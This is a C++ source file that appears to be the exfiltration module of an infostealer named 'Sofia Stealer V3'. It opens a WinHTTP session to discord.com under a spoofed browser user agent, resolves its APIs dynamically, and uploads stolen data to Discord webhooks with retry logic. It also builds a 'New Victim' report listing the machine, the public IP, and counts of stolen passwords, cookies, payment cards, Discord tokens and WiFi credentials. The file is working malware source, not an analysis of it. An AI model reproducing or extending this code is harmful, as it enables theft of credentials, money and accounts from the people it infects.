#include "Webhook.h"
#include "../utils/Config.h"
#include "../utils/DynamicAPI.h"
#include "../core/Obfuscation.h"
#include "../core/Internal.h"
#include <sstream>
#include <winhttp.h>
#include "../../DebugLog.h"

namespace Modules {

    // ── Persistent WinHTTP session ───────────────────────────────────
    // Reused across all Send* calls in one run — avoids
    // WinHttpOpen + WinHttpConnect overhead on every upload.
    // Thread-safe: initialized once before parallel threads start.
    static HINTERNET g_hSession  = NULL;
    static HINTERNET g_hConnect  = NULL;
    static volatile LONG g_httpLock = 0;

    static __forceinline void HttpAcquire() {
        while (InterlockedCompareExchange(&g_httpLock, 1, 0) != 0) YieldProcessor();
    }
    static __forceinline void HttpRelease() {
        InterlockedExchange(&g_httpLock, 0);
    }

    bool Webhook::InitSession() {
        if (!DynAPI::WHttpOpen) return false;
        if (g_hSession) return true;   // already initialized
        g_hSession = DynAPI::WHttpOpen(
            L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!g_hSession) return false;
        // Aggressive timeouts: resolve=5s, connect=5s, send=10s, recv=15s
        DynAPI::WHttpSetTime(g_hSession, 5000, 5000, 10000, 15000);
        g_hConnect = DynAPI::WHttpConnect(
            g_hSession, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (!g_hConnect) {
            DynAPI::WHttpCloseH(g_hSession);
            g_hSession = NULL;
            return false;
        }
        SLOG("[+] Webhook: persistent session initialized.");
        return true;
    }

    void Webhook::CloseSession() {
        if (g_hConnect) { DynAPI::WHttpCloseH(g_hConnect); g_hConnect = NULL; }
        if (g_hSession) { DynAPI::WHttpCloseH(g_hSession); g_hSession = NULL; }
    }

    // ── Core POST — reuses persistent session/connect handles ────────
    // Mutex on hRequest only (per-request handle is not shared).
    // Returns HTTP status code, 0 on transport error.
    static DWORD PostRaw(const std::string& path,
                         const std::string& contentType,
                         const std::string& body) {
        if (!g_hSession || !g_hConnect) return 0;
        std::wstring wPath(path.begin(), path.end());
        // Each request needs its own hRequest handle — no lock needed here
        HINTERNET hR = DynAPI::WHttpOpenReq(
            g_hConnect, L"POST", wPath.c_str(),
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
        if (!hR) return 0;
        std::wstring wCT(contentType.begin(), contentType.end());
        BOOL sent = DynAPI::WHttpSendReq(
            hR, wCT.c_str(), (DWORD)wCT.size(),
            (LPVOID)body.c_str(), (DWORD)body.size(),
            (DWORD)body.size(), 0);
        DWORD code = 0;
        if (sent && DynAPI::WHttpRecvResp(hR, NULL)) {
            DWORD sz = sizeof(code);
            DynAPI::WHttpQueryH(hR,
                WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                WINHTTP_HEADER_NAME_BY_INDEX, &code, &sz,
                WINHTTP_NO_HEADER_INDEX);
        }
        DynAPI::WHttpCloseH(hR);
        return code;
    }

    // ── Rate-limit aware POST ─────────────────────────────────────────
    // Discord returns HTTP 429 with Retry-After when rate-limited.
    // Instead of a fixed 250ms delay per-file, we only sleep when told to.
    static bool PostWithRateLimit(const std::string& path,
                                  const std::string& contentType,
                                  const std::string& body,
                                  int maxRetries = 4) {
        for (int i = 0; i < maxRetries; ++i) {
            DWORD code = PostRaw(path, contentType, body);
            if (code >= 200 && code < 300) {
                SLOG("  [+] POST ok (code=%lu attempt=%d)", code, i + 1);
                return true;
            }
            if (code == 429) {
                // Rate-limited: back off 1s and retry
                SLOG("  [!] Rate-limited (429), backing off 1s...");
                Internal::SleepMs(1000);
                continue;
            }
            if (code == 0) {
                // Transport error — reconnect and retry
                SLOG("  [-] Transport error, retrying (%d/%d)...", i + 1, maxRetries);
                Internal::SleepMs(300);
                continue;
            }
            SLOG("  [-] POST failed code=%lu", code);
            return false;
        }
        return false;
    }

    // ── Public API ───────────────────────────────────────────────────

    bool Webhook::SendFile(const std::string& url,
                           const std::string& content,
                           const std::string& fileName) {
        // Extract /api/webhooks/... path from full URL
        std::string pfx = "/api/webhooks";
        size_t pos = url.find(pfx);
        std::string path = (pos != std::string::npos) ? url.substr(pos) : url;

        // Build multipart/form-data body
        std::string bnd = "SofiaBnd" + std::to_string(
            Internal::_GetTickCount ? Internal::_GetTickCount() : 42);
        std::string body;
        body.reserve(content.size() + 256);
        body  = "--"; body += bnd; body += "\r\n";
        body += "Content-Disposition: form-data; name=\"file\"; filename=\"";
        body += fileName;
        body += "\"\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n";
        body += content;
        body += "\r\n--"; body += bnd; body += "--\r\n";
        std::string ct = "Content-Type: multipart/form-data; boundary=" + bnd;
        SLOG("[*] Uploading: %s (%zu bytes)", fileName.c_str(), content.size());
        return PostWithRateLimit(path, ct, body);
    }

    bool Webhook::SendEmbed(const std::string& url,
                            const std::string& jsonPayload) {
        std::string pfx = "/api/webhooks";
        size_t pos = url.find(pfx);
        std::string path = (pos != std::string::npos) ? url.substr(pos) : url;
        SLOG("[*] Sending summary embed...");
        return PostWithRateLimit(path, "Content-Type: application/json", jsonPayload);
    }

    bool Webhook::SendFileRetry(const std::string& url,
                                const std::string& content,
                                const std::string& fileName,
                                int maxRetries) {
        // Now just delegates to SendFile which already handles retries internally
        (void)maxRetries;
        return SendFile(url, content, fileName);
    }

    std::string Webhook::BuildSummaryEmbed(
        const std::string& hostname, const std::string& username,
        const std::string& os, const std::string& ip,
        int passwords, int cookies, int cards, int tokens,
        int wifi, bool clipboard)
    {
        std::stringstream r;
        r << "{\"embeds\":[{";
        r << "\"title\":\"Sofia Stealer V3 - New Victim\",";
        r << "\"color\":3447003,";
        r << "\"footer\":{\"text\":\"Sofia Stealer V3\"},";
        r << "\"fields\":[";
        r << "{\"name\":\"Machine\",\"value\":\"" << hostname << " / " << username << "\",\"inline\":false},";
        r << "{\"name\":\"OS\",\"value\":\"" << os << "\",\"inline\":false},";
        r << "{\"name\":\"Public IP\",\"value\":\"" << ip << "\",\"inline\":true},";
        r << "{\"name\":\"Passwords\",\"value\":\"" << passwords << "\",\"inline\":true},";
        r << "{\"name\":\"Cookies\",\"value\":\"" << cookies << "\",\"inline\":true},";
        r << "{\"name\":\"Cards\",\"value\":\"" << cards << "\",\"inline\":true},";
        r << "{\"name\":\"Discord\",\"value\":\"" << tokens << "\",\"inline\":true},";
        r << "{\"name\":\"WiFi\",\"value\":\"" << wifi << "\",\"inline\":true},";
        r << "{\"name\":\"Clipboard\",\"value\":\"" << (clipboard ? "Yes" : "Empty") << "\",\"inline\":true}";
        r << "]}]}";
        return r.str();
    }
}
